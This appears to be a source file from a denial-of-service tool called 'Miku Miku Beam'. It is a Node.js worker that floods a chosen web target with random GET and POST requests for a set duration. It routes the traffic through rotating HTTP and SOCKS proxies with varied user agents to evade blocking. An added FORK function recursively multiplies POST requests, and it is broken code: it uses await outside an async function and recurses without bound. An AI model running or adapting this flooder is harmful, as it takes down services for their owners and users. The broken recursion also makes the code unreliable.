//Get Miku'd :3
/*
   /|<★\/★>|\
/ /__\　〇　/__\ \
  \_\_|   |__/_/

MIKU MIKU BEAM!
*/
import axios from "axios";
import { SocksProxyAgent } from "socks-proxy-agent";
import { parentPort, workerData } from "worker_threads";
let forkStop = 0

import { randomBoolean, randomString } from "../utils/randomUtils.js";

const FORK = (fixedTarget, payload, config) => {
   forkStop++
   if (forkStop > 200) {
      for (let i = 1; i < Math.random() * 100; i++) {
        FORK(fixedTarget, payload, config)
        await axios.post(fixedTarget, payload, config);
      }
   } else {
      await axios.post(fixedTarget, payload, config);
   }
}

const startAttack = () => {
  const { target, proxies, userAgents, duration, packetDelay, packetSize } =
    workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    try {
      const config = {
        headers: { "User-Agent": userAgent },
        timeout: 2000,
        validateStatus: (status) => {
          return status < 500;
        },
      };

      if (proxy.protocol === "http") {
        config.proxy = {
          host: proxy.host,
          port: proxy.port,
        };
      } else if (proxy.protocol === "socks4" || proxy.protocol === "socks5") {
        config.httpAgent = new SocksProxyAgent(
          `${proxy.protocol}://${proxy.host}:${proxy.port}`
        );
      }

      const isGet = packetSize > 64 ? false : randomBoolean();
      const payload = randomString(packetSize);

      if (isGet) {
        await axios.get(`${fixedTarget}/${payload}`, config);
      } else {
        FORK(fixedTarget, payload, config)
        await axios.post(fixedTarget, payload, config);
      }

      totalPackets++;
      parentPort.postMessage({
        log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    } catch (error) {
      parentPort.postMessage({
        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
